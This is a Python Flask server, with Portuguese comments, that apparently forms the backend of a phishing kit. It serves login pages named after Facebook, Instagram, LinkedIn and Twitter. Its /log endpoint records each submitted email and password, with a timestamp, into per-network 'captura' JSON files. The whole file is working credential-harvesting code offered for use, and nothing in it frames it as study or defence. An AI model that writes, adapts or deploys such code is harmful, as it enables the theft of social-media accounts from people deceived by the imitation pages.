from flask import Flask, request, send_from_directory, render_template
from flask_cors import CORS
import json
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

# Configuração dos diretórios
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')
STATIC_DIR = os.path.join(BASE_DIR, 'static')
DATA_DIR = os.path.join(BASE_DIR, 'data')

# Garante que o diretório de dados existe
os.makedirs(DATA_DIR, exist_ok=True)

# Função para obter o arquivo de log baseado na rede social
def get_log_file(social_network):
    log_file = os.path.join(DATA_DIR, f'captura_{social_network}.json')
    # Garante que o arquivo existe
    if not os.path.exists(log_file):
        with open(log_file, 'w', encoding='utf-8') as f:
            f.write('[]')
    return log_file

@app.route('/log/<social_network>', methods=['POST'])
def log_keys(social_network):
    try:
        data = request.get_json()
        if not data:
            return {'status': 'error', 'message': 'Dados inválidos'}, 400

        email = data.get('email', '')
        senha = data.get('senha', '')
        # Formato brasileiro: dia/mês/ano hora:minuto:segundo
        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        log_file = get_log_file(social_network)
        
        # Lê o conteúdo atual do arquivo
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                try:
                    logs = json.load(f)
                except json.JSONDecodeError:
                    logs = []
        except FileNotFoundError:
            logs = []

        # Adiciona o novo log
        logs.append({
            "timestamp": timestamp,
            "rede_social": social_network,
            "email": email,
            "senha": senha
        })

        # Salva os logs atualizados
        with open(log_file, 'w', encoding='utf-8') as f:
            json.dump(logs, f, indent=4)

        return {'status': 'ok'}, 200
    except Exception as e:
        print(f"Erro ao processar log: {str(e)}")
        return {'status': 'error', 'message': 'Erro interno do servidor'}, 500

# Rotas para servir as páginas HTML
@app.route('/')
def serve_facebook():
    return render_template('index.html')

@app.route('/instagram')
def serve_instagram():
    return render_template('instagram.html')

@app.route('/linkedin')
def serve_linkedin():
    return render_template('linkedin.html')

@app.route('/twitter')
def serve_twitter():
    return render_template('twitter.html')

# Rota para servir arquivos estáticos (CSS e JS)
@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(STATIC_DIR, filename)

if __name__ == '__main__':
    # Cria os arquivos de log iniciais
    for network in ['facebook', 'instagram', 'linkedin', 'twitter']:
        get_log_file(network)
    
    app.run(port=5000, debug=True)
